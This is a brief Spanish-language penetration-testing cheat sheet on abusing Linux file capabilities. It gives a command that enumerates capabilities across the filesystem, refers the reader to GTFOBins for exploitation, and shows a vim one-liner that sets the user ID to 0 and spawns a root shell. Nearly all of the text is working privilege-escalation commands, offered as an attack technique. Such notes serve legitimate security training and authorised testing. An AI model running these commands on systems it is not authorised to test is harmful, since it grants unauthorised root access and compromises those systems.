# Capabilities

## Capabilities

{% code overflow="wrap" %}
```bash
getcap -r / 2>/dev/null   #Enumera capabilities

# Luego, buscar en GTFOBins cómo explotar la capability
```
{% endcode %}

Ejemplo vim capability

{% code overflow="wrap" %}
```bash
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
{% endcode %}
